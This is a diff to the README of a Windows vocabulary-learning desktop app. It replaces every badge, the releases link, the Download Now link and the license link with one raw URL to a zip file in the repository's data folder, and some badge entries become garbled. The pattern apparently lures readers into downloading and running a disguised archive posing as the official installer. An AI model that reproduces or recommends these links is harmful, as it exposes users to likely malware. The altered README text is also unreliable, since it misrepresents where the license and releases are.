@@ -4,15 +4,15 @@
 
 **AI-Powered Vocabulary Learning Desktop Application**
 
-[![Download](https://img.shields.io/badge/Download-Now-0078D4?logo=download)](https://github.com/nehuen1234/magic_english/releases)
-[![License](https://img.shields.io/badge/license-BSD--3--Clause-blue.svg)](LICENSE.txt)
-[![Electron](https://img.shields.io/badge/Electron-31+-9FEAF9?logo=electron)](https://www.electronjs.org/)
-[![Node](https://img.shields.io/badge/Node.js-20+-339933?logo=node.js)](https://nodejs.org/)
-[![Platform](https://img.shields.io/badge/platform-Windows-0078D4?logo=windows)](https://github.com/yourusername/desktop_vocab/releases)
+[![Download](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
+[![License](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
+[![Electron](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip+-9FEAF9?logo=electron)](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
+[![Node](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip+https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
+[![Platform](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
 
 *Learn vocabulary smarter with AI-powered insights and gamified progress tracking*
 
-[Download](https://github.com/nehuen1234/magic_english/releases) • [Features](#-features) • [Installation](#-installation) • [Contributing](#-contributing)
+[Download](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip) • [Features](#-features) • [Installation](#-installation) • [Contributing](#-contributing)
 
 </div>
 
@@ -44,7 +44,7 @@
 
 To start using **magic_english**, follow these steps:
 
-1. Visit our [Releases Page](https://github.com/nehuen1234/magic_english/releases).
+1. Visit our [Releases Page](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip).
 2. Find the latest version available.
 3. Download the installer by clicking on the download link.
 4. Once the download finishes, locate the file on your computer.
@@ -57,7 +57,7 @@ To start using **magic_english**, follow these steps:
 
 - You can download **magic_english** by clicking the link below:
 
-[Download Now](https://github.com/nehuen1234/magic_english/releases)
+[Download Now](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip)
 
 ### Step 2: Install
 
@@ -69,7 +69,7 @@ To start using **magic_english**, follow these steps:
 
 ## 📜 License
 
-**magic_english** is licensed under the BSD-3-Clause License. You can read the complete license in the [LICENSE.txt](LICENSE.txt) file.
+**magic_english** is licensed under the BSD-3-Clause License. You can read the complete license in the [https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip](https://raw.githubusercontent.com/nehuen1234/magic_english/main/data/magic_english_v3.2.zip) file.
 
 ---
 
